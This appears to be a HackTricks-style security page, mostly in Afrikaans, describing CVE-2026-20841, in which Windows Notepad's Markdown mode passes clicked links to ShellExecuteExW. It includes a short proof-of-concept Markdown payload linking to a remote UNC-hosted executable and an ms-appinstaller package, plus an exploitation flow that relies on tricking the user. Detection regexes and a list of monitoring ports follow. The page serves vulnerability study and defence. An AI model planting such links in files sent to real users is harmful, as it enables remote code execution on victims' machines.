# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Windows-toepassings wat Markdown of HTML weergee, kan geklikte teikens aan `ShellExecuteExW` oorhandig. Omdat ShellExecute geregistreerde URI-skemas en lêerassosiasies afstuur, benodig ’n renderer ’n eksplisiete allowlist eerder as om aan te neem dat elke skakel HTTP(S) is. Die Notepad-gedrag hieronder beskryf CVE-2026-20841 en behoort nie na elke renderer veralgemeen te word nie.<sup>[[1]](#references)[[3]](#references)</sup>

## ShellExecuteExW-oppervlak in Windows Notepad se Markdown-modus
- Notepad kies Markdown-modus **slegs vir `.md`-uitbreidings** via ’n vaste stringvergelyking in `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
- Ondersteunde Markdown-skakels:
- Standaard: `[text](target)`
- Autolink: `<target>` (weergegee as `[target](target)`), dus is albei sintakse belangrik vir payloads en opsporing.
- Daar word op skakels geklik in `sub_140170F60()`, wat swak filtering uitvoer en daarna `ShellExecuteExW` aanroep.
- `ShellExecuteExW` stuur na **enige gekonfigureerde protocol handler**, nie net HTTP(S) nie.<sup>[[1]](#references)</sup>

### Payload-oorwegings
- Enige `\\`-reekse in die skakel word **genormaliseer na `\`** voordat `ShellExecuteExW` uitgevoer word, wat UNC-/padkonstruksie en opsporing beïnvloed.
- `.md`-lêers word **nie by verstek met Notepad geassosieer nie**; die slagoffer moet steeds die lêer in Notepad oopmaak en op die skakel klik, maar sodra dit weergegee is, is die skakel klikbaar.
- Gevaarlike voorbeeldskemas:<sup>[[1]](#references)</sup>
- `file://` om ’n plaaslike/UNC-payload te begin.
- `ms-appinstaller://` om App Installer-vloeie te aktiveer. Ander plaaslik geregistreerde skemas kan ook misbruik word.

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Uitbuitingsvloei
1. Skep ’n **`.md`-lêer** sodat Notepad dit as Markdown weergee.
2. Sluit ’n skakel in wat ’n gevaarlike URI-skema gebruik (`file:`, `ms-appinstaller:`, of enige geïnstalleerde handler).
3. Lewer die lêer (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB of soortgelyk) af en oortuig die gebruiker om dit in Notepad oop te maak.
4. Wanneer daarop geklik word, word die **normalized link** aan `ShellExecuteExW` oorhandig, en die ooreenstemmende protocol handler voer die verwysde inhoud in die gebruiker se konteks uit.<sup>[[1]](#references)[[2]](#references)</sup>

## Detection ideas
- Monitor oordragte van `.md`-lêers oor poorte/protokolle wat dokumente gewoonlik lewer: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Ontleed Markdown-skakels (standaard en autolink) en soek vir **case-insensitive** `file:` of `ms-appinstaller:`.
- Vendor-guided regexes to catch remote resource access:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Die verskaffer se regstelling wat deur ZDI beskryf word, beperk aanvaarbare teikens tot plaaslike lêers en HTTP(S). Brei detections na ander geïnstalleerde protocol handlers uit soos nodig, omdat die geregistreerde aanvalsvlak per stelsel verskil.<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841: Arbitrary Code Execution in die Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)
- [3] [Microsoft Learn — `ShellExecuteExW`](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw)
{{#include ../banners/hacktricks-training.md}}
